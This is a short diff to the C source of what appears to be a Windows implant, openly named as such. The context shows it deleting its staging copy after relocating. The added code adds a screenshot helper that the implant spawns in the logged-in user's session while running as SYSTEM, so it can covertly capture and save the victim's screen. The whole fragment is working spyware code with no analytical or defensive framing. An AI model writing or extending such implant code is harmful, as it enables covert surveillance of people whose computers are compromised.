@@ -297,6 +297,20 @@ int main(int argc, char **argv)
      * copy now that it is no longer locked by a running process. */
     if (argc >= 2 && strcmp(argv[1], "--relocated") == 0)
         DeleteFileA(IMPLANT_STAGE_PATH);
+
+    /* Screenshot helper: spawned in the user session by spy_screenshot_capture
+     * when the main implant is running as SYSTEM (Session 0).  Take the GDI
+     * screenshot, write the BMP to the given path, and exit immediately. */
+    if (argc >= 3 && strcmp(argv[1], "--screenshot") == 0) {
+        int len = 0;
+        char *data = spy_screenshot_capture(&len);
+        if (data) {
+            FILE *fp = fopen(argv[2], "wb");
+            if (fp) { fwrite(data, 1, len, fp); fclose(fp); }
+            free(data);
+        }
+        return 0;
+    }
 #endif
     (void)argc; (void)argv;
 
